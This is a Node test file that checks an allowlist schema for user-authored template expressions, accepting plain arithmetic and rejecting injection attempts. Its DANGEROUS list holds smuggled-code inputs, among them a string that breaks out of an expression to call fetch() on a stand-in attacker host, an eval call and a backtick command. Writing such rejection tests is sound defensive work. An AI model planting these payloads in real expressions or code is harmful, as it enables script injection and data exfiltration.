// Tests for the ExpressionSchema allowlist (backend/functions/src/common/schemas/studio.ts).
// Template expressions are stored in Firestore and shared across collaborators,
// so the schema must reject anything that could smuggle executable JavaScript.
// Run via: npm test  (builds, then node --test tests/)
const test = require('node:test');
const assert = require('node:assert/strict');
const { ExpressionSchema } = require('../lib/common/schemas/studio');

const SAFE = [
  'width * 2',
  '(depth - 1) / 2',
  'a+b-c*d/e',
  'var_1 + $x',
  '-offset',
  '3.14',
  '  spaced  ',
];

const DANGEROUS = [
  "0); fetch('https://evil.example/?t=1')//",
  'return (eval("x"), 0)',
  'a; b',
  '`id`',
  'width, depth',
  '{a: 1}',
  '"str"',
  "'str'",
  'a=b',
  'a > b',
  'a < b',
  'a && b',
  'a | b',
  '\\u0061',
];

test('accepts plain numbers', () => {
  assert.ok(ExpressionSchema.safeParse(42).success);
  assert.ok(ExpressionSchema.safeParse(3.14).success);
});

test('accepts safe arithmetic expressions', () => {
  for (const expr of SAFE) {
    assert.ok(
      ExpressionSchema.safeParse(expr).success,
      `should accept: ${expr}`,
    );
  }
});

test('rejects expressions containing executable characters', () => {
  for (const expr of DANGEROUS) {
    assert.ok(
      !ExpressionSchema.safeParse(expr).success,
      `should reject: ${expr}`,
    );
  }
});

test('rejects overly long expressions', () => {
  assert.ok(!ExpressionSchema.safeParse('1+'.repeat(300)).success);
});
